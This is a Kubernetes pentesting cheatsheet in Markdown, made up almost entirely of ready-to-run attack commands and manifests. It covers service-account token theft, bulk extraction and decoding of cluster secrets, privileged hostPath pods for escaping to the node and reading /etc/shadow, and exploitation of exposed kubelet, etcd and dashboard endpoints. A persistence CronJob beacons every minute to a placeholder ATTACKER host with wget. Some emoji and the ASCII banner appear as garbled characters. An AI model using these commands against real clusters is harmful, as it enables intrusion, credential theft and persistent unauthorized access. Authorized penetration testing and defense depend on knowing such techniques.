# â˜¸ï¸ Kubernetes Pentesting Cheatsheet

```
â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•”â•â•â•  â•šâ•â•â•â•â–ˆâ–ˆâ•‘
â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘
â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â•â•   â•šâ•â•   â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•
```

---

## ğŸ” Kubernetes Enumeration

### From Inside Pod
```bash
# Check if in Kubernetes
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Service account token
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# API server endpoint
env | grep KUBERNETES
# KUBERNETES_SERVICE_HOST=10.96.0.1
# KUBERNETES_SERVICE_PORT=443

# Interact with API
curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces \
  -H "Authorization: Bearer ${TOKEN}"
```

### Using kubectl
```bash
# Cluster info
kubectl cluster-info
kubectl version
kubectl get nodes -o wide

# Namespaces
kubectl get namespaces
kubectl get ns

# All resources in namespace
kubectl get all -n NAMESPACE

# Pods
kubectl get pods --all-namespaces
kubectl get pods -o wide
kubectl describe pod POD_NAME

# Services
kubectl get services --all-namespaces
kubectl get svc

# Deployments
kubectl get deployments --all-namespaces
```

---

## ğŸ”‘ RBAC Enumeration

### Check Current Permissions
```bash
# What can I do?
kubectl auth can-i --list

# Specific permissions
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl auth can-i create pods --as=system:serviceaccount:default:default

# Get role bindings
kubectl get rolebindings --all-namespaces
kubectl get clusterrolebindings

# Get roles
kubectl get roles --all-namespaces
kubectl get clusterroles

# Describe role
kubectl describe role ROLE_NAME -n NAMESPACE
kubectl describe clusterrole ROLE_NAME
```

### Dangerous RBAC Permissions
```yaml
# Can create pods = potential escape
- pods/create
- pods/*

# Can exec into pods
- pods/exec

# Can read secrets
- secrets/get
- secrets/list

# Can modify RBAC
- rolebindings/*
- clusterrolebindings/*

# Cluster admin
- '*' on '*'
```

---

## ğŸ” Secrets Extraction

### List & Read Secrets
```bash
# List secrets
kubectl get secrets --all-namespaces
kubectl get secrets -n NAMESPACE

# Get secret content (base64 encoded)
kubectl get secret SECRET_NAME -o yaml
kubectl get secret SECRET_NAME -o jsonpath='{.data}'

# Decode secret
kubectl get secret SECRET_NAME -o jsonpath='{.data.password}' | base64 -d

# Get all secrets decoded
kubectl get secrets -o json | jq '.items[].data | to_entries[] | "\(.key): \(.value | @base64d)"'
```

### Common Secret Locations
```bash
# Service account tokens
kubectl get secret -n kube-system | grep token

# Docker registry credentials
kubectl get secret regcred -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d

# TLS certificates
kubectl get secret tls-secret -o jsonpath='{.data.tls\.crt}' | base64 -d
```

---

## ğŸš€ Pod Escape & Privilege Escalation

### Privileged Pod Creation
```yaml
# Create privileged pod
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: pwn
    image: alpine
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
```

```bash
# Apply and exec
kubectl apply -f privileged-pod.yaml
kubectl exec -it privileged-pod -- chroot /host /bin/bash
# Now you have host access!
```

### Pod with Service Account Token Mount
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: token-pod
spec:
  serviceAccountName: admin-sa  # If you can use admin SA
  automountServiceAccountToken: true
  containers:
  - name: attacker
    image: alpine
    command: ["/bin/sh", "-c", "sleep infinity"]
```

### Escape via hostPath
```yaml
# If you can create pods with hostPath
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "cat /host-etc/shadow"]
    volumeMounts:
    - mountPath: /host-etc
      name: etc-vol
  volumes:
  - name: etc-vol
    hostPath:
      path: /etc
```

---

## ğŸŒ Kubelet API Exploitation

### Anonymous Kubelet Access
```bash
# Check if kubelet allows anonymous
curl -k https://NODE_IP:10250/pods
curl -k https://NODE_IP:10250/runningpods

# Using kubeletctl
kubeletctl pods -s NODE_IP
kubeletctl scan rce -s NODE_IP

# Execute commands
kubeletctl exec "/bin/bash" -p POD_NAME -c CONTAINER_NAME -s NODE_IP
```

### Read-Only Kubelet (10255)
```bash
# If port 10255 is open (read-only)
curl http://NODE_IP:10255/pods
curl http://NODE_IP:10255/spec
```

---

## ğŸ¯ Attacking Kubernetes Components

### API Server Exploitation
```bash
# Check if API is accessible without auth
curl -k https://API_SERVER:6443/api/v1/namespaces

# Check for anonymous access
curl -k https://API_SERVER:6443/api/v1/namespaces/default/pods

# Common ports
# 6443 - API Server (HTTPS)
# 8080 - API Server (HTTP - insecure)
```

### etcd Exploitation
```bash
# If etcd is exposed (port 2379)
etcdctl --endpoints=http://ETCD_IP:2379 get / --prefix --keys-only

# Get secrets from etcd
etcdctl --endpoints=http://ETCD_IP:2379 get /registry/secrets --prefix

# Using curl
curl http://ETCD_IP:2379/v2/keys/?recursive=true
```

### Dashboard Exploitation
```bash
# Check for exposed dashboard (no auth)
# Common URLs:
http://NODE_IP:30000
http://NODE_IP:8443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/

# If accessible, create admin token or exec into pods
```

---

## ğŸ› ï¸ Kubernetes Pentesting Tools

### kube-hunter
```bash
# Install
pip install kube-hunter

# Remote scan
kube-hunter --remote TARGET_CLUSTER

# Internal scan (from pod)
kube-hunter --pod

# List vulnerabilities
kube-hunter --list
```

### Peirates
```bash
# K8s attack framework
git clone https://github.com/inguardians/peirates
cd peirates && go build

# Run
./peirates

# Menu options:
# - Get secrets
# - Mount service account
# - Create privileged pod
# - Exec into pods
```

### kubeaudit
```bash
# Security audit
kubeaudit all

# Specific checks
kubeaudit privileged
kubeaudit capabilities
kubeaudit hostns
kubeaudit nonroot
```

### kubectl-who-can
```bash
# Install
kubectl krew install who-can

# Check who can do what
kubectl who-can create pods
kubectl who-can get secrets
kubectl who-can '*' '*'
```

---

## ğŸ“‹ Kubernetes Pentesting Checklist

```markdown
â–¡ Enumerate cluster info (nodes, namespaces)
â–¡ Check current RBAC permissions (auth can-i --list)
â–¡ List and extract secrets
â–¡ Check for privileged pods
â–¡ Test kubelet API access (10250/10255)
â–¡ Check for exposed API server
â–¡ Test anonymous authentication
â–¡ Check for exposed etcd
â–¡ Check for exposed dashboard
â–¡ Attempt pod creation with privileges
â–¡ Run kube-hunter for automated scan
â–¡ Check network policies
```

---

## ğŸ”’ Post-Exploitation

### Persistence via CronJob
```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: persistence
spec:
  schedule: "* * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: shell
            image: alpine
            command: ["/bin/sh", "-c", "wget http://ATTACKER/beacon"]
          restartPolicy: OnFailure
```

### Backdoor via Mutating Webhook
```bash
# If you can create MutatingWebhookConfiguration
# Every new pod can be modified to include your code
```

---

## ğŸ”— Related Cheatsheets

- [Docker Pentesting](./Docker-Pentesting.md)
- [Cloud Security](../Cloud-Security/README.md)

---

**Back to Overview:** [ğŸ³ Container Security](./README.md)
